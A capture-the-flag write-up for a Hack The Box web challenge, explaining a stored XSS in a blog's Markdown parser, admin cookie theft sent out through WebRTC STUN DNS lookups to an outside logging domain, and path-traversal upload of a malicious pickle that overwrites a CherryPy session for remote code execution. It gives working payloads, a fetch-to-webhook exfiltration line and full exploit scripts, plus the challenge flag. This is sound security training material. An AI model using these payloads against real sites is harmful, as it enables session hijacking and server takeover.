<h1 style="color:blue;">QuikBlog Challenge</h1>

**Platform**: Hack The Box

**Author**: 0xL0m4

**Category**: Web (Hard)

<img width="1666" height="160" alt="image" src="https://github.com/user-attachments/assets/537985a5-3743-418e-88c2-e6e33b7d8d65" />



## Challenge Description

I’ve built a new blog with a custom Markdown parser and need your pentesting expertise. As part of Task Force Phoenix, you’ll simulate Volnaya’s APT tactics huntting XSS, injections, and edge-case parsing flaws to harden my blog against a looming cyber-dark age.

Let’s uncover every vulnerability and secure the parser before Operation Blackout strikes.

## Tools Used

* Burp Suite
* Docker
* Browser Developer Tools
* Python
* CyberChef
* Webhook


## Steps

### 1. Preparing the environment

First, I added the challenge ip to my `/etc/hosts` file:

```
echo "<IP> quikblog.htb" | sudo tee -a /etc/hosts
```

The challenge also provided the source code, so I downloaded it and and you can build the application locally using Docker.

After opening the website, I found a simple blogging platform with registration and login page.

I registered a new account using:

```
Username: test
Password: test
```

After logging in, I was redirected to the home page where I could create blog posts consisting of a title and Markdown content.


### 2. Reviewing the source code

While reviewing the source code, I noticed that post content is rendered using Markdown.

The parsing logic is implemented inside markdown2html.js

Some important observations:

* Every `<` character is converted into `&lt;`, preventing normal HTML injection.
* Usernames and titles only allow lowercase letters, numbers, and underscores.
* The application is built using the CherryPy framework.

I also noticed that an admin bot automatically visits the index page every minute.

That immediately suggested looking for a stored XSS vulnerability.


### 3. Bypassing the Markdown parser

The Markdown parser supports code blocks.

For example:

````markdown
```json
{"name":"test"}
```
````

The parser supports multiple languages, including:

* json
* rust
* plain text by default

While testing the JSON parser, I noticed something interesting.

The language name is inserted into an HTML attribute.

Instead of writing only json, I tried injecting another HTML attribute:

````markdown
```json' id=x autofocus tabindex=1 onfocus='alert(1)
test
```
````

As soon as the page loaded, the JavaScript executed successfully.

This confirmed a stored XSS vulnerability through the Markdown parser.


### 4. The proxy obstacle

The obvious next step was stealing the administrator's session cookie.

Normally I would use:

```
fetch("https://my-webhook/?c="+document.cookie)
```

However, after checking the Docker configuration, I found:

```
ENV http_proxy=http://127.0.0.1:9999
ENV https_proxy=http://127.0.0.1:9999
ENV HTTP_PROXY=http://127.0.0.1:9999
ENV HTTPS_PROXY=http://127.0.0.1:9999
ENV no_proxy=127.0.0.1,localhost
```

This means every external HTTP or HTTPS request is redirected through a local proxy that doesn't actually exist.

As a result, any request to external websites fails with Connection Refused.

So exfiltrating data through a normal webhook wasn't possible.


### 5. Looking for another exfiltration channel

At this point, I needed another way to exfiltrate the administrator's cookie.

I started thinking about browser features that could trigger DNS lookups without relying on HTTP requests.

One idea was to abuse WebRTC. When creating an RTCPeerConnection with a STUN server, the browser first resolves the STUN server's hostname through DNS before attempting the connection.

If I encoded the cookie inside the STUN hostname, the browser would generate DNS requests containing my data. Those DNS queries could then be captured using a service such as webhook.


### 6. Building the XSS payload

I wrote a Python script that generates a JavaScript payload.

The payload performs the following steps:

1. Reads document.cookie.
2. Splits the cookie into two parts.
3. Converts each part into hexadecimal.
4. Creates two fake STUN servers:

```
<chunk1>.mydomain.dnshook.site
<chunk2>.mydomain.dnshook.site
```

Creating the RTCPeerConnection forces the browser to resolve those domains.

The DNS requests are then captured by DNSHook.

The generated payload is finally injected into the vulnerable Markdown parser.

Python Script:
```
def to_ascii_codes(string):
    return "".join(str(hex(ord(c))) for c in string).replace("0x", "\\x").replace("\\xa", "\\x0a")


def xss():
    leak_cookie = f"""
      function convertToHex(str) {{
        var hex = "";
        for (var i = 0; i < str.length; i++) {{
           hex += str.charCodeAt(i).toString(16);
        }}
        return hex;
      }}
    
      function leakCookieViaRTC(domain, cookie) {{
        var sectionLength = Math.ceil(cookie.length / 2);
        for (var i = 0; i < 2; i++) {{
          var section = cookie.slice(i * sectionLength, (i + 1) * sectionLength);
          if (section) {{
            var hexSection = convertToHex(section);
            var p = new RTCPeerConnection({{
              iceServers: [{{
                urls: `stun:${{hexSection}}.${{domain}}`
              }}]
            }});
            p.createDataChannel("d");
            p.setLocalDescription();
          }}
        }}
      }}
    
    leakCookieViaRTC("<your_dnshook>", document.cookie);
    """

    encoded = to_ascii_codes(leak_cookie)
    parser_xss = f"```json' autofocus tabindex=1 onfocus=eval('{encoded}');//\nblabla\n```"
    return parser_xss


print(xss())
```
We  can use eval function since the CSP directive script-src 'unsafe-eval' allows JavaScript to use functions that evaluate strings as code.

### 7. Capturing the administrator's session

After publishing the malicious post[put any title and put the previouse output python script on the content], I waited for the administrator bot to visit the homepage.

A few moments later, DNSHook received two DNS requests:

```
73657373696f6e5f69643d306531616232383838313034356431...
```

```
38633935653934626239393030396634323734626234313336...
```

Each request contained half of the session cookie encoded in hexadecimal.

<img width="1920" height="793" alt="image" src="https://github.com/user-attachments/assets/838b92a9-bbaf-47b2-bbaa-b392fb401e5c" />

I combined both parts and decoded them using CyberChef.

The result was the administrator's session ID.

<img width="1920" height="781" alt="image" src="https://github.com/user-attachments/assets/2d2e753e-ac21-4996-9783-215898ada908" />

### 8. Becoming the administrator

I replaced my own session cookie with the administrator's session ID.

After refreshing the page, I was logged in as the administrator.

The admin page exposed a new feature: File Upload


### 9. Analyzing the upload functionality

The upload function looked like this:

```python
def upload_file(self, file):
    username = cherrypy.session.get('username')

    if not username or not is_admin(username):
        raise cherrypy.HTTPRedirect('/login')

    remote_addr = cherrypy.request.remote.ip

    if remote_addr in ['127.0.0.1', '::1']:
        return "Uploads from localhost are not allowed."

    upload_path = os.path.join(uploads_dir, file.filename)

    with open(upload_path, 'wb') as f:
        while chunk := file.file.read(8192):
            f.write(chunk)
```

The upload accepted any file extension and does not sanitize the name of file.

So I went back to researching CherryPy itself.



### 10. Discovering the CherryPy session vulnerability

While reading CherryPy's source code:

The _load() function deserializes session files using Python's pickle module.

This is dangerous because loading a pickle object results in arbitrary code execution.

If I could overwrite a session file with a malicious pickle payload, CherryPy would execute my code the next time that session was loaded.

you can see it [here](https://github.com/cherrypy/cherrypy/blob/main/cherrypy/lib/sessions.py)

### 11. Crafting the malicious session

I created a Python script that:

* Creates a malicious pickle object.
* Uses the upload functionality.
* Writes the payload over a CherryPy session file.
* Triggers CherryPy to load the malicious session.

The python script:

```
import requests , os , pickle , io

HOST , PORT = "quikblog.htb" , 31233
Chall_url = f"http://{HOST}:{PORT}"
Admin = "<admin_seesion_id>"

class RCE(object):
          def __reduce__(self):
                   return (os.system , ("/readflag > /app/static/flag.txt",))
payload = pickle.dumps(RCE())

p_file = io.BytesIO(payload)
p_file.name = "../../../app/sessions/session-salma"
files = {
       "file": (p_file.name , p_file , "aaplication/octet-stream")
}

cookie_data = {
       "session_id" : Admin
}
requests.post(f"{Chall_url}/upload_file" , cookies=cookie_data , files=files)
cookie_data = {
       "session_id":"salma"
}
requests.post(f"{Chall_url}/admin" , cookies=cookie_data )

```

- Defines the target host and port (quikblog.htb:31233) and builds the base URL.
- Stores an admin session ID to authenticate privileged requests.
- Defines a malicious RCE class using \_\_reduce__ for code execution during unpickling.
- Executes a system command that reads the flag and writes it to /app/static/flag.txt.
- Serializes the malicious object using pickle.dumps() to create the payload [from object to bytes].
- Wraps the payload inside an in-memory file using io.BytesIO().
- Manipulates the filename using path traversal (../../../app/sessions/session-salma) to target the session directory.
- Sends the first POST request to /upload_file using the admin session cookie.
- Sends a second POST request to /admin to trigger processing.
- Triggers pickle deserialization, leading to remote code execution.
- Final result: flag becomes accessible via /static/flag.txt.


### 12. Triggering code execution

After running the exploit script, I triggered the malicious session.

CherryPy deserialized the modified session file.

During deserialization using loads(), the embedded command executed with the application's privileges.

Finally, I visited:

```
http://quikblog.htb:<PORT>/static/flag.txt
```

Voilaaa!!

The flag was successfully retrieved.

<img width="1920" height="759" alt="image" src="https://github.com/user-attachments/assets/3c33e518-2d2a-4d52-a676-17d476519dcf" />


## The Flag

```
HTB{th3_t0ugher_sess1on5_the_tough3r_th3_1uck!!}
```
#

[The challenge link](https://app.hackthebox.com/challenges/QuickBlog?tab=play_challenge)

See you in the next writeup!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
